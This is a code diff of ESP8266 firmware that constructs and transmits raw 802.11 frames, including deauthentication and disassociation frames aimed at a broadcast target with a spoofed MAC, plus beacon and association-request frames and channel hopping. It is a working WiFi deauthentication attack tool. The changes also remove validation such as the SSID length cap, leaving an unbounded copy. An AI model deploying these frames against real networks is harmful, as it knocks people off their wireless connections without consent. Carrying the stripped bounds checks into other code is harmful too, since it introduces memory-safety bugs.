@@ -33,54 +33,15 @@ extern "C" {
  * Always ensure compliance with local laws and regulations.
  */
 
-// Global exports matching header declarations
-uint16_t sequence_number __attribute__((aligned(4)));
-uint8_t channel_scan __attribute__((aligned(4)));
-
-// Global variables for internal use
-static uint32_t __attribute__((aligned(4))) g_sequence_number = 0;
-static uint32_t __attribute__((aligned(4))) g_wifi_channel = 1;
-static uint32_t __attribute__((aligned(4))) g_channel_scan = 1;
-
-// Hopping log control
-static bool hop_log_enabled = true;           // Control hopping log output
-static bool hop_log_on_error = true;          // Log only on channel hop errors
-static bool hop_log_on_success = false;       // Log on successful transmissions
-static uint32_t last_hop_log = 0;            // Timestamp of last hop log
-static const uint32_t HOP_LOG_INTERVAL = 1000; // Minimum interval between logs (ms)
-
-// Channel statistics array with proper alignment
-ChannelStats channel_stats[WIFI_CHANNEL_MAX + 1] __attribute__((aligned(4))) = {0};
-
-// Accessor functions to ensure atomic access
-ICACHE_RAM_ATTR static inline uint16_t get_sequence_number() {
-    return sequence_number & 0xFFFF;
-}
-
-ICACHE_RAM_ATTR static inline void increment_sequence_number() {
-    sequence_number = (sequence_number + 1) & 0xFFFF;
-}
-
-ICACHE_RAM_ATTR static inline uint8_t get_wifi_channel() {
-    return g_wifi_channel & 0xFF;
-}
-
-ICACHE_RAM_ATTR static inline void set_wifi_channel(uint8_t channel) {
-    g_wifi_channel = channel & 0xFF;
-}
-
-ICACHE_RAM_ATTR static inline uint8_t get_channel_scan() {
-    return channel_scan & 0xFF;
-}
-
-ICACHE_RAM_ATTR static inline void set_channel_scan(uint8_t channel) {
-    channel_scan = channel & 0xFF;
-}
+// Global variables for frame management
+uint16_t sequence_number = 0;
 
 // Replace esp_random with ESP equivalent
 #define esp_random() (*(volatile uint32_t*)0x3FF20E44)
 
 // Global MAC addresses and channel
+uint8_t wifi_channel = 1;
+
 // Target AP MAC Address (replace with your target)
 uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast address
 // Your spoofed MAC Address
@@ -105,29 +66,12 @@ uint16_t reason_code = 0x0001;
 ICACHE_RAM_ATTR uint8_t beacon_buffer[512] __attribute__((aligned(4)));
 ICACHE_RAM_ATTR uint8_t deauth_buffer[512] __attribute__((aligned(4)));
 ICACHE_RAM_ATTR uint8_t disassoc_buffer[512] __attribute__((aligned(4)));
-
-/**
- * Packet building implementations
- */
-extern "C" {
-
 /**
  * Build a raw 802.11 Beacon frame
  */
 uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* bssid, const char* ssid, uint8_t channel) {
-  if (!buffer || !bssid || !ssid || channel < 1 || channel > 14) {
-    Serial.println(F("Error: Invalid beacon parameters"));
-    return 0;
-  }
-
-  if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
-    Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
-    return 0;
-  }
-
-  memset(buffer, 0, MAX_PACKET_SIZE);
+  memset(buffer, 0, 512);
   uint16_t pos = 0;
-  
   // MAC Header
   ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
   header->frame_ctrl.protocol_version = 0;
@@ -145,7 +89,7 @@ uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* bssid, const char* 
   memcpy(header->addr1, "\xff\xff\xff\xff\xff\xff", 6); // Broadcast
   memcpy(header->addr2, bssid, 6); // Source (BSSID)
   memcpy(header->addr3, bssid, 6); // BSSID
-  header->seq_ctrl = get_next_sequence() << 4;
+  header->seq_ctrl = sequence_number++ << 4;
   pos += sizeof(ieee80211_mac_header_t);
   // Fixed parameters
   // Timestamp (8 bytes, set to 0)
@@ -157,10 +101,6 @@ uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* bssid, const char* 
   // SSID
   buffer[pos++] = 0x00; // Tag: SSID
   uint8_t ssid_len = strlen(ssid);
-  if (ssid_len > 32) {
-    Serial.println("SSID too long. Truncating to 32 characters.");
-    ssid_len = 32;
-  }
   buffer[pos++] = ssid_len;
   memcpy(buffer + pos, ssid, ssid_len); pos += ssid_len;
   // Supported Rates
@@ -183,26 +123,8 @@ uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* bssid, const char* 
  * Build a raw 802.11 Deauthentication frame
  */
 uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
-  if (!buffer || !dst || !src || !bssid) {
-    Serial.println(F("Error: Invalid deauth parameters"));
-    return 0;
-  }
-
-  if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
-    Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
-    return 0;
-  }
-
-  if (reason == 0 || reason > 0x0024) {  // Valid reason codes are 1-36
-    Serial.println(F("Error: Invalid reason code"));
-    return 0;
-  }
-
-  memset(buffer, 0, MAX_PACKET_SIZE);
+  memset(buffer, 0, 512);
   uint16_t pos = 0;
-
-  // Initialize MAC header with interrupt protection
-  ETS_WDEV_INTR_DISABLE();
   ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
   header->frame_ctrl.protocol_version = 0;
   header->frame_ctrl.type = 0; // Management
@@ -219,7 +141,7 @@ uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t*
   memcpy(header->addr1, dst, 6);
   memcpy(header->addr2, src, 6);
   memcpy(header->addr3, bssid, 6);
-  header->seq_ctrl = get_next_sequence() << 4;
+  header->seq_ctrl = sequence_number++ << 4;
   pos += sizeof(ieee80211_mac_header_t);
   // Reason code (2 bytes, little endian)
   buffer[pos++] = reason & 0xFF;
@@ -235,26 +157,8 @@ uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t*
  * Build a raw 802.11 Disassociation frame
  */
 uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
-  if (!buffer || !dst || !src || !bssid) {
-    Serial.println(F("Error: Invalid disassociation parameters"));
-    return 0;
-  }
-
-  if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
-    Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
-    return 0;
-  }
-
-  if (reason == 0 || reason > 0x0008) {  // Valid reason codes for disassociation are 1-8
-    Serial.println(F("Error: Invalid reason code for disassociation"));
-    return 0;
-  }
-
-  memset(buffer, 0, MAX_PACKET_SIZE);
+  memset(buffer, 0, 512);
   uint16_t pos = 0;
-
-  // Initialize MAC header with interrupt protection
-  ETS_WDEV_INTR_DISABLE();
   ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
   header->frame_ctrl.protocol_version = 0;
   header->frame_ctrl.type = 0; // Management
@@ -271,7 +175,7 @@ uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst, const uint8_
   memcpy(header->addr1, dst, 6);
   memcpy(header->addr2, src, 6);
   memcpy(header->addr3, bssid, 6);
-  header->seq_ctrl = get_next_sequence() << 4;
+  header->seq_ctrl = sequence_number++ << 4;
   pos += sizeof(ieee80211_mac_header_t);
   // Reason code (2 bytes, little endian)
   buffer[pos++] = reason & 0xFF;
@@ -283,152 +187,28 @@ uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst, const uint8_
   return pos;
 }
 
-/**
- * Builds an 802.11 Association Request packet that conforms precisely to IEEE standards
- * @param buffer The buffer to store the packet
- * @param dst_addr Destination MAC address (AP)
- * @param src_addr Source MAC address (Station)
- * @param ssid The SSID to associate with
- * @param channel The WiFi channel to operate on
- * @return The size of the generated packet
- */
-ICACHE_RAM_ATTR uint16_t build_association_packet(uint8_t* buffer, const uint8_t* dst_addr, 
-                                        const uint8_t* src_addr, const char* ssid, uint8_t channel) {
-    // Input validation with detailed error messages
-    if (!buffer) {
-        Serial.println(F("Error: NULL buffer"));
-        return 0;
-    }
-    if (!dst_addr || !src_addr || !ssid) {
-        Serial.println(F("Error: Invalid address or SSID"));
-        return 0;
-    }
-    if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
-        Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
-        return 0;
-    }
-    if (strlen(ssid) > 32) {
-        Serial.println(F("Error: SSID too long (max 32 bytes)"));
-        return 0;
-    }
-    if (channel < 1 || channel > 14) {
-        Serial.println(F("Error: Invalid channel (1-14)"));
-        return 0;
-    }
-
-    memset(buffer, 0, MAX_PACKET_SIZE);
-    uint16_t pos = 0;
-
-    // Initialize MAC header
-    ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
-    init_mgmt_frame_header(header, IEEE80211_SUBTYPE_ASSOC_REQ, dst_addr, src_addr, dst_addr);
-    
-    // Set sequence number atomically
-    header->seq_ctrl = get_next_sequence() << 4;  // Upper 12 bits are sequence number
-    pos += sizeof(ieee80211_mac_header_t);
-  
-  // Duration ID
-  header->duration_id = 0;  // In little-endian byte order
-  
-  // Addresses
-  memcpy(header->addr1, dst_addr, 6);  // Destination/AP MAC (BSSID)
-  memcpy(header->addr2, src_addr, 6);  // Source/Station MAC
-  memcpy(header->addr3, dst_addr, 6);  // BSSID (same as destination for Association)
-  
-  // Sequence Control - Increment for each new frame
-  header->seq_ctrl = get_next_sequence() << 4;  // Upper 12 bits are sequence number, lower 4 are fragment number
-  
-  pos += sizeof(ieee80211_mac_header_t);
-  
-  // ----- Frame Body -----
-  
-  // Fixed Parameters
-  assoc_fixed_params_t* fixed_params = (assoc_fixed_params_t*)(buffer + pos);
-    // Fixed Parameters - Must be in little-endian byte order
-  fixed_params->capability_info = 0x0411;  // ESS (0x01) + Short Preamble (0x0020) + Privacy (0x0010)
-  
-  // Listen Interval - Number of beacon intervals station will listen for
-  fixed_params->listen_interval = 0x000A;  // 10 beacon intervals
-  
-  // Validate fixed parameters size
-  if (sizeof(assoc_fixed_params_t) != 4) {
-    Serial.println(F("Error: Invalid fixed parameters size"));
-    return 0;
-  }
-  
-  pos += sizeof(assoc_fixed_params_t);
-    // ----- Tagged Parameters (Information Elements) -----
-  
-  // SSID Parameter - MANDATORY (Element ID 0)
-  if (!add_tagged_param(buffer + pos, 0x00, strlen(ssid), (uint8_t*)ssid)) {
-    Serial.println(F("Error: SSID too long"));
-    return 0;
-  }
-  pos += 2 + strlen(ssid);  // ElementID + Length + SSID
-  
-  // Supported Rates - MANDATORY (Element ID 1)
-  const uint8_t supported_rates[] = {
-    0x82,  // 1 Mbps   (BSS Basic Rate)
-    0x84,  // 2 Mbps   (BSS Basic Rate)
-    0x8B,  // 5.5 Mbps (BSS Basic Rate)
-    0x96,  // 11 Mbps  (BSS Basic Rate)
-    0x0C,  // 6 Mbps
-    0x12,  // 9 Mbps
-    0x18,  // 12 Mbps
-    0x24   // 18 Mbps
-  };
-  if (!add_tagged_param(buffer + pos, 0x01, sizeof(supported_rates), supported_rates)) {
-    Serial.println(F("Error: Could not add supported rates"));
-    return 0;
-  }
-  pos += 2 + sizeof(supported_rates);
-  
-  // Extended Supported Rates - MANDATORY for 802.11n
-  const uint8_t ext_rates[] = {
-      0x30,  // 24 Mbps
-      0x48,  // 36 Mbps
-      0x60,  // 48 Mbps
-      0x6C   // 54 Mbps
-  };
-  if (!add_tagged_param(buffer + pos, IEEE80211_ELEMID_EXT_SUPP_RATES, sizeof(ext_rates), ext_rates)) {
-      Serial.println(F("Error: Could not add extended rates"));
-      return 0;
-  }
-  pos += 2 + sizeof(ext_rates);
-
-  // DS Parameter Set - CRITICAL for channel setting
-  if (!add_tagged_param(buffer + pos, IEEE80211_ELEMID_DS_PARAMS, 1, &channel)) {
-      Serial.println(F("Error: Could not add DS Parameter Set"));
-      return 0;
-  }
-  pos += 3;  // ElementID (1) + Length (1) + Channel (1)
-
-  // HT Capabilities - For 802.11n support
-  uint8_t ht_caps[26] = {0};
-  ht_caps[0] = 0x6F;  // HT Capability Information (LDPC, 40MHz, GF, SGI-20)
-  ht_caps[1] = 0x00;  // HT Capability Information
-  ht_caps[2] = 0x17;  // A-MPDU Parameters (64K buffer size)
-  memset(ht_caps + 3, 0xFF, 10);  // Supported MCS Set (0-76)
-  
-  return pos;  // Return length excluding FCS
-}
-
-} // extern "C"
+// Global variables
+uint8_t channel_scan = 1;
 
 // Memory aligned buffer for packet construction (aligned for DMA operations)
-static uint32_t __attribute__((aligned(4))) packet_buffer_aligned[128];  // 512 bytes
-#define packet_buffer ((uint8_t*)packet_buffer_aligned)
+ICACHE_RAM_ATTR uint8_t packet_buffer[512] __attribute__((aligned(4)));
 
-// Debug flag - needs to be volatile as it's changed in interrupt context
-static volatile bool debug_mode = false;
+// Debug flag
+bool debug_mode = true;
 
 // Channel hopping configuration
 #define MIN_CHANNEL 1
 #define MAX_CHANNEL 14
 #define DWELL_TIME 50  // ms per channel
 #define CHANNEL_SWITCH_DELAY 5  // ms
-#define MAX_PACKET_SIZE 512    // Maximum packet size
-#define BUFFER_ALIGNMENT 4     // Required alignment for ESP8266 DMA
+
+// Channel statistics for adaptive hopping
+struct ChannelStats {
+    uint32_t last_success;    // Timestamp of last successful transmission
+    uint8_t fail_count;       // Consecutive failures
+    uint8_t busy_count;       // Times channel was found busy
+    bool blacklisted;         // Temporary blacklist flag
+} channel_stats[MAX_CHANNEL + 1];
 
 // Channel selection strategy
 enum HoppingStrategy {
@@ -452,11 +232,11 @@ const char* get_tx_status_string(int status) {
 }
 
 /**
- * Ensure interrupt-safe functions are marked with ICACHE_RAM_ATTR
+ * Check if hardware is ready for transmission
  */
-ICACHE_RAM_ATTR bool check_hardware_ready() {
-    uint32_t status = READ_PERI_REG(0x60000914);
-    return (status & 0x00000001) == 0;
+bool check_hardware_ready() {
+  uint32_t status = READ_PERI_REG(0x60000914);
+  return (status & 0x00000001) == 0;
 }
 
 /**
@@ -476,6 +256,133 @@ bool parse_mac_address(const char* mac_str, uint8_t* mac_bytes) {
 }
 
 /**
+ * Builds an 802.11 Association Request packet that conforms precisely to IEEE standards
+ * @param buffer The buffer to store the packet
+ * @param dst_addr Destination MAC address (AP)
+ * @param src_addr Source MAC address (Station)
+ * @param ssid The SSID to associate with
+ * @param channel The WiFi channel to operate on
+ * @return The size of the generated packet
+ */
+uint16_t build_association_packet(uint8_t* buffer, const uint8_t* dst_addr, 
+                                 const uint8_t* src_addr, const char* ssid, uint8_t channel) {
+  memset(buffer, 0, 512);  // Clear buffer
+  uint16_t pos = 0;
+  
+  // ----- MAC Header -----
+  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
+  
+  // Frame Control Field - Must be exactly as per 802.11 standard for Association Request
+  header->frame_ctrl.protocol_version = 0;
+  header->frame_ctrl.type = 0;  // Management frame
+  header->frame_ctrl.subtype = 0;  // Association Request
+  header->frame_ctrl.to_ds = 0;
+  header->frame_ctrl.from_ds = 0;
+  header->frame_ctrl.more_frag = 0;
+  header->frame_ctrl.retry = 0;
+  header->frame_ctrl.power_mgmt = 0;
+  header->frame_ctrl.more_data = 0;
+  header->frame_ctrl.protected_frame = 0;
+  header->frame_ctrl.order = 0;
+  
+  // Duration ID
+  header->duration_id = 0;  // In little-endian byte order
+  
+  // Addresses
+  memcpy(header->addr1, dst_addr, 6);  // Destination/AP MAC (BSSID)
+  memcpy(header->addr2, src_addr, 6);  // Source/Station MAC
+  memcpy(header->addr3, dst_addr, 6);  // BSSID (same as destination for Association)
+  
+  // Sequence Control - Increment for each new frame
+  header->seq_ctrl = sequence_number++ << 4;  // Upper 12 bits are sequence number, lower 4 are fragment number
+  
+  pos += sizeof(ieee80211_mac_header_t);
+  
+  // ----- Frame Body -----
+  
+  // Fixed Parameters
+  assoc_fixed_params_t* fixed_params = (assoc_fixed_params_t*)(buffer + pos);
+  
+  // Capability Information - Little endian byte order
+  fixed_params->capability_info = 0x0011;  // ESS (bit 0) + Privacy (bit 4)
+  
+  // Listen Interval - Little endian byte order
+  fixed_params->listen_interval = 0x000A;  // 10 beacon intervals
+  
+  pos += sizeof(assoc_fixed_params_t);
+  
+  // ----- Tagged Parameters (Information Elements) -----
+  
+  // SSID Parameter - MANDATORY
+  buffer[pos++] = 0x00;  // Element ID: SSID
+  uint8_t ssid_len = strlen(ssid);
+  buffer[pos++] = ssid_len;  // Length
+  memcpy(buffer + pos, ssid, ssid_len);
+  pos += ssid_len;
+  
+  // Supported Rates - MANDATORY
+  buffer[pos++] = 0x01;  // Element ID: Supported Rates
+  buffer[pos++] = 0x08;  // Length
+  // Note: MSB (bit 7) set indicates a Basic Rate
+  buffer[pos++] = 0x82;  // 1 Mbps (basic rate)
+  buffer[pos++] = 0x84;  // 2 Mbps (basic rate)
+  buffer[pos++] = 0x8B;  // 5.5 Mbps (basic rate)
+  buffer[pos++] = 0x96;  // 11 Mbps (basic rate)
+  buffer[pos++] = 0x0C;  // 6 Mbps
+  buffer[pos++] = 0x12;  // 9 Mbps
+  buffer[pos++] = 0x18;  // 12 Mbps
+  buffer[pos++] = 0x24;  // 18 Mbps
+  
+  // Extended Supported Rates - OPTIONAL but recommended
+  buffer[pos++] = 0x32;  // Element ID: Extended Supported Rates
+  buffer[pos++] = 0x04;  // Length
+  buffer[pos++] = 0x30;  // 24 Mbps
+  buffer[pos++] = 0x48;  // 36 Mbps
+  buffer[pos++] = 0x60;  // 48 Mbps
+  buffer[pos++] = 0x6C;  // 54 Mbps
+  
+  // HT Capabilities - OPTIONAL, for 802.11n
+  buffer[pos++] = 0x2D;  // Element ID: HT Capabilities
+  buffer[pos++] = 0x1A;  // Length: 26 bytes
+  buffer[pos++] = 0x01; buffer[pos++] = 0x00;  // HT Capabilities Info
+  buffer[pos++] = 0x00;  // A-MPDU Parameters
+  // Supported MCS Set (16 bytes)
+  buffer[pos++] = 0xFF; buffer[pos++] = 0xFF; // MCS 0-15 supported
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  // HT Extended Capabilities
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  // Transmit Beamforming Capabilities
+  buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00;
+  // ASEL Capabilities
+  buffer[pos++] = 0x00;
+  
+  // Power Capability - OPTIONAL but helps
+  buffer[pos++] = 0x21;  // Element ID: Power Capability
+  buffer[pos++] = 0x02;  // Length
+  buffer[pos++] = 0x00;  // Minimum Transmit Power Capability
+  buffer[pos++] = 0x64;  // Maximum Transmit Power Capability (100 dBm)
+  
+  // Supported Channels - OPTIONAL but helps
+  buffer[pos++] = 0x24;  // Element ID: Supported Channels
+  buffer[pos++] = 0x02;  // Length
+  buffer[pos++] = 0x01;  // First Channel (1)
+  buffer[pos++] = 0x0B;  // Number of Channels (11)
+
+  // DS Parameter Set - CRITICAL for channel setting
+  buffer[pos++] = 0x03;  // Element ID: DS Parameter Set
+  buffer[pos++] = 0x01;  // Length
+  buffer[pos++] = channel;  // Current Channel
+
+  // Note: FCS (4 bytes) is calculated and appended by hardware
+  
+  return pos;  // Return length excluding FCS
+}
+
+/**
  * Low-level transmission function using the ESP8266's built-in hardware
  * This uses the vendor-specific register layout to directly control the WiFi chip
  * @param packet Pointer to the packet buffer
@@ -484,52 +391,39 @@ bool parse_mac_address(const char* mac_str, uint8_t* mac_bytes) {
  * @param channel WiFi channel to transmit on (1-14)
  */
 ICACHE_RAM_ATTR bool transmit_raw_packet(const uint8_t* packet, uint16_t length, uint8_t rate, uint8_t channel) {
-    // Validate parameters first
-    if (!packet || length == 0 || length > MAX_PACKET_SIZE) {
-        return false;
-    }
+  if (!packet || length == 0 || length > 1500) return false;
+  
+  // Save current state and disable interrupts
+  uint8_t old_op_mode = wifi_get_opmode();
+  noInterrupts();
 
-    // Verify buffer alignment for DMA operations
-    if (((uintptr_t)packet) % BUFFER_ALIGNMENT != 0) {
-        return false;
-    }
-
-    // Critical section begins
-    noInterrupts();
-    uint8_t old_op_mode = wifi_get_opmode();
-    
-    // Use a static aligned buffer to avoid heap fragmentation
-    static uint32_t __attribute__((aligned(4))) tx_buffer_aligned[128];  // 512 bytes
-    uint8_t* tx_buffer = (uint8_t*)tx_buffer_aligned;
-    
-    bool result = false;
-    
-    // Make sure we don't write past our buffer
-    if (length <= sizeof(tx_buffer_aligned)) {
-        // Copy the packet to our aligned buffer
-        memcpy(tx_buffer, packet, length);
-        
-        // Switch to station mode and set channel
-        wifi_set_opmode(STATION_MODE);
-        if (wifi_set_channel(channel)) {
-            // Short delay for channel switch with watchdog feed
-            os_delay_us(1000);
-            system_soft_wdt_feed();
-            
-            // Disable interrupts during the actual transmission
-            ETS_UART_INTR_DISABLE();
-            result = wifi_send_pkt_freedom(tx_buffer, length, false) == 0;
-            ETS_UART_INTR_ENABLE();
-        }
-        
-        // Restore WiFi mode
-        wifi_set_opmode(old_op_mode);
-    }
-    
-    // Critical section ends
+  // Switch to station mode and set channel
+  wifi_set_opmode(STATION_MODE);
+  if (!wifi_set_channel((uint8)channel)) {
     interrupts();
-    
-    return result;
+    return false;
+  }
+  
+  // Wait for channel switch and feed watchdog
+  os_delay_us(1000);
+  system_soft_wdt_feed();
+  
+  // Prepare packet for transmission
+  bool result = false;
+  
+  // Create a non-const buffer for wifi_send_pkt_freedom
+  uint8* tx_buffer = (uint8*)malloc(length);
+  if (tx_buffer) {
+    memcpy(tx_buffer, packet, length);
+    result = wifi_send_pkt_freedom(tx_buffer, (int)length, false) == 0;
+    free(tx_buffer);
+  }
+  
+  // Restore previous mode and re-enable interrupts
+  wifi_set_opmode(old_op_mode);
+  interrupts();
+  
+  return result;
 }
 
 /**
@@ -623,139 +517,52 @@ void print_packet_details(const uint8_t* packet, uint16_t length) {
   Serial.println("--- End of Packet Details ---\n");
 }
 
-// Hopping log output handler
-void log_channel_hop(uint8_t new_channel, bool success, const char* reason) {
-    if (!hop_log_enabled) return;
-    
-    uint32_t current_time = millis();
-    if (current_time - last_hop_log < HOP_LOG_INTERVAL) return;
-    
-    if (success && !hop_log_on_success) return;
-    if (!success && !hop_log_on_error) return;
-    
-    last_hop_log = current_time;
-    
-    if (success) {
-        Serial.printf("[HOP] Channel switched to %d\n", new_channel);
-    } else {
-        Serial.printf("[HOP-ERR] Failed to switch to channel %d", new_channel);
-        if (reason) {
-            Serial.printf(" - %s", reason);
-        }
-        Serial.println();
-    }
-}
+uint8_t next_channel(uint8_t current_channel) {
+    uint8_t best_channel = current_channel;
+    uint8_t lowest_fails = 255;
+    uint8_t new_channel = current_channel;
 
-// Print command menu
-void print_command_menu() {
-    Serial.println("\nAvailable Commands:");
-    Serial.println("1-9: Set channel");
-    Serial.println("t: Trigger single transmission");
-    Serial.println("c: Toggle continuous mode");
-    Serial.println("d: Toggle debug mode");
-    Serial.println("l: Toggle all hopping logs");
-    Serial.println("e: Toggle error-only logging");
-    Serial.println("u: Toggle success logging");
-    Serial.println("m: Set MAC address");
-    Serial.println("f: Select frame type");
-    Serial.println("n: Set SSID");
-    Serial.println("r: Set reason code");
-    Serial.println("s: Show current status");
-    Serial.println("?: Show this menu");
-}
-
-// Add the declaration of 'get_next_sequence' at the top of the file
-ICACHE_RAM_ATTR static uint16_t get_next_sequence() {
-    static uint16_t sequence = 0;
-    return sequence++ & 0xFFF; // Wrap around at 4095
-}
-
-// Enhanced channel selection with timing and state management
-ICACHE_RAM_ATTR uint8_t next_channel(uint8_t current_channel) {
-    static uint32_t last_hop_time = 0;
-    static uint8_t sequential_count = 0;
-    uint32_t current_time = millis();
-    
-    // Enforce minimum dwell time
-    if (current_time - last_hop_time < DWELL_TIME) {
-        return current_channel;
-    }
-    
-    uint8_t next_ch = current_channel;
-    const uint8_t MAX_ATTEMPTS = 5;
-    uint8_t attempts = 0;
-    
     switch(hopping_strategy) {
         case SEQUENTIAL:
-            do {
-                sequential_count = (sequential_count + 1) % (MAX_CHANNEL - MIN_CHANNEL + 1);
-                next_ch = MIN_CHANNEL + sequential_count;
-                attempts++;
-            } while (attempts < MAX_ATTEMPTS && 
-                    (next_ch == current_channel || channel_stats[next_ch].isBlacklisted()));
-            break;
+            return (current_channel >= MAX_CHANNEL) ? MIN_CHANNEL : current_channel + 1;
             
-        case ADAPTIVE: {
-            uint8_t best_channel = current_channel;
-            uint32_t best_metric = 0xFFFFFFFF;
-            
-            // Calculate channel metrics based on multiple factors
-            for (uint8_t ch = MIN_CHANNEL; ch <= MAX_CHANNEL; ch++) {
-                if (ch == current_channel || channel_stats[ch].isBlacklisted()) {
-                    continue;
-                }
-                
-                uint32_t status = channel_stats[ch].status;
-                uint8_t fail_count = (status >> 16) & 0xFF;
-                uint8_t busy_count = (status >> 8) & 0xFF;
-                uint32_t time_since_success = current_time - channel_stats[ch].last_success;
-                
-                // Weighted metric calculation
-                uint32_t metric = (fail_count * 10) + (busy_count * 5) + (time_since_success / 1000);
-                
-                if (metric < best_metric) {
-                    best_metric = metric;
+            for(uint8_t ch = MIN_CHANNEL; ch <= MAX_CHANNEL; ch++) {
+                if(!channel_stats[ch].blacklisted && 
+                   channel_stats[ch].fail_count < lowest_fails) {
+                    lowest_fails = channel_stats[ch].fail_count;
                     best_channel = ch;
                 }
             }
-            next_ch = best_channel;
-            break;
-        }
+            return best_channel;
             
         case RANDOM:
+            // Avoid current channel and blacklisted ones
+            uint8_t new_channel;
             do {
-                // Use hardware RNG for better randomness
-                next_ch = MIN_CHANNEL + ((*((volatile uint32_t*)0x3FF20E44)) % (MAX_CHANNEL - MIN_CHANNEL + 1));
-                attempts++;
-            } while (attempts < MAX_ATTEMPTS && 
-                    (next_ch == current_channel || channel_stats[next_ch].isBlacklisted()));
-            break;
+                new_channel = MIN_CHANNEL + (esp_random() % (MAX_CHANNEL - MIN_CHANNEL + 1));
+            } while(new_channel == current_channel || 
+                   channel_stats[new_channel].blacklisted);
+            return new_channel;
     }
-    
-    last_hop_time = current_time;
-    return next_ch;
+    return current_channel;  // Fallback
 }
 
-ICACHE_RAM_ATTR void update_channel_stats(uint8_t channel, bool success) {
+void update_channel_stats(uint8_t channel, bool success) {
     if(success) {
         channel_stats[channel].last_success = millis();
-        channel_stats[channel].resetFailCount();
-        channel_stats[channel].setBlacklisted(false);
+        channel_stats[channel].fail_count = 0;
+        channel_stats[channel].blacklisted = false;
     } else {
-        channel_stats[channel].incrementFailCount();
-        
-        // Get current fail count from packed status
-        uint32_t status = channel_stats[channel].status;
-        uint8_t fail_count = (status >> 16) & 0xFF;
+        channel_stats[channel].fail_count++;
         
         // Blacklist channel if too many failures
-        if(fail_count > 5) {
-            channel_stats[channel].setBlacklisted(true);
+        if(channel_stats[channel].fail_count > 5) {
+            channel_stats[channel].blacklisted = true;
             // Reset blacklist after 5 seconds
             static unsigned long blacklist_timer = millis();
             if(millis() - blacklist_timer > 5000) {
                 for(uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
-                    channel_stats[i].setBlacklisted(false);
+                    channel_stats[i].blacklisted = false;
                 }
                 blacklist_timer = millis();
             }
@@ -763,107 +570,44 @@ ICACHE_RAM_ATTR void update_channel_stats(uint8_t channel, bool success) {
     }
 }
 
-// Constants for RSSI handling
-static const int32_t RSSI_INVALID = -128;
-static const int32_t RSSI_THRESHOLD = -65;
-static const uint8_t RSSI_SAMPLES = 3;
-static const uint16_t RSSI_SAMPLE_INTERVAL = 5; // ms
-
-// Safely check if WiFi is initialized and ready for RSSI readings
-ICACHE_RAM_ATTR static bool is_wifi_initialized() {
-    uint8_t mode = wifi_get_opmode();
-    bool has_power = (READ_PERI_REG(0x3FF00058) & (1 << 6)) != 0;
-    return (mode != WIFI_OFF) && has_power;
-}
-
-// Get RSSI with averaging and validation
-ICACHE_RAM_ATTR static int32_t get_valid_rssi() {
-    if (!is_wifi_initialized()) {
-        return RSSI_INVALID;
-    }
-
-    // Take multiple samples to reduce noise
-    int32_t rssi_sum = 0;
-    uint8_t valid_samples = 0;
-
-    for (uint8_t i = 0; i < RSSI_SAMPLES; i++) {
-        int32_t sample = WiFi.RSSI();
-        if (sample != 0 && sample != -127) {
-            rssi_sum += sample;
-            valid_samples++;
-        }
-        // Small delay between samples
-        delayMicroseconds(100);
-    }
-
-    return valid_samples > 0 ? (rssi_sum / valid_samples) : RSSI_INVALID;
-}
-
-// Enhanced channel clear assessment
-ICACHE_RAM_ATTR bool is_channel_clear(uint8_t channel) {
-    static uint32_t last_check_time = 0;
-    uint32_t current_time = millis();
-
-    // Rate limit RSSI checks
-    if (current_time - last_check_time < RSSI_SAMPLE_INTERVAL) {
-        return true;  // Assume clear if checked too recently
-    }
-    last_check_time = current_time;
-
-    // Get RSSI with validation
-    int32_t rssi = get_valid_rssi();
+bool is_channel_clear(uint8_t channel) {
+    // Check if channel is free using RSSI
+    int32_t rssi = WiFi.RSSI();
+    const int32_t RSSI_THRESHOLD = -65;  // Adjust based on environment
     
-    // Handle invalid RSSI cases
-    if (rssi == RSSI_INVALID) {
-        return true;  // Assume clear if we can't get valid reading
+    if (rssi == 0) {
+        // RSSI not available, assume channel is clear
+        return true;
     }
-
-    // Update channel statistics atomically
+    
     if (rssi > RSSI_THRESHOLD) {
-        uint32_t busy_mask = 0xFF00;
-        uint32_t old_status;
-        do {
-            old_status = channel_stats[channel].status;
-            uint8_t busy_count = (old_status >> 8) & 0xFF;
-            if (busy_count < 255) busy_count++;
-            uint32_t new_status = (old_status & ~busy_mask) | (busy_count << 8);
-            // Atomic update
-            asm volatile ("rsil a15, 1\n\t"
-                         "s32i %0, %1, 0\n\t"
-                         "rsil a15, 0"
-                         :
-                         : "r" (new_status), "r" (&channel_stats[channel].status)
-                         : "a15", "memory");
